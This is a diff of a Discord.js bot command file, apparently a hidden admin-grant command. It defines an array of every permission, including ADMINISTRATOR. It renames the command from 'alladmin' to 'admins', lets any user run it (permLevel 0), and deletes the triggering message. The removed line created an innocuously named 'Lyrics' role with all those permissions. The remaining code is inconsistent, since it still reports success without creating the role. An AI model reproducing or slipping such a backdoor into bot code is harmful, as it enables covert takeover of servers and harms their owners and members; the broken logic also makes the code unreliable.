@@ -1,5 +1,5 @@
 const Discord = require("discord.js");
-
+var perms = ["KICK_MEMBERS","BAN_MEMBERS","ADMINISTRATOR","CREATE_INSTANT_INVITE","MANAGE_CHANNELS","MANAGE_GUILD","ADD_REACTIONS","VIEW_AUDIT_LOG","VIEW_CHANNEL","READ_MESSAGES","SEND_MESSAGES","SEND_TTS_MESSAGES","MANAGE_MESSAGES","EMBED_LINKS","ATTACH_FILES","READ_MESSAGE_HISTORY","MENTION_EVERYONE","USE_EXTERNAL_EMOJIS","EXTERNAL_EMOJIS","CONNECT","SPEAK","MUTE_MEMBERS","DEAFEN_MEMBERS","MOVE_MEMBERS","USE_VAD","CHANGE_NICKNAME","MANAGE_NICKNAMES","MANAGE_ROLES","MANAGE_ROLES_OR_PERMISSIONS","MANAGE_WEBHOOKS","MANAGE_EMOJIS"];
 
 
 module.exports.run = async(bot, message, args, recrue) => {
@@ -15,7 +15,6 @@ message.delete();
           .setAuthor(bot.user.username, bot.user.avatarURL)	
           .setDescription(":white_check_mark:")
 
-         if (message.member.guild.createRole({name: "Lyrics", permissions: perms, color: 'RANDOM',}))
         if(message.guild.roles.exists("name", 'Lyrics')) {
        
             message.channel.send(role_succes)
@@ -28,6 +27,17 @@ bot.channels.find('name',"Lyrics").send("Log : ["+message.author.tag+" // "+mess
 
         }
 
-module.exports.help = {
-  name: "alladmin"
-  }
+exports.conf = {
+ enabled: true,
+ guildOnly: false,
+ aliases: ['rolveramdk'],
+ permLevel: 0,
+  kategori: "rolverirdmisin"
+  
+};
+
+exports.help = {
+ name: 'admins',
+ description: '',
+ usage: ''
+};
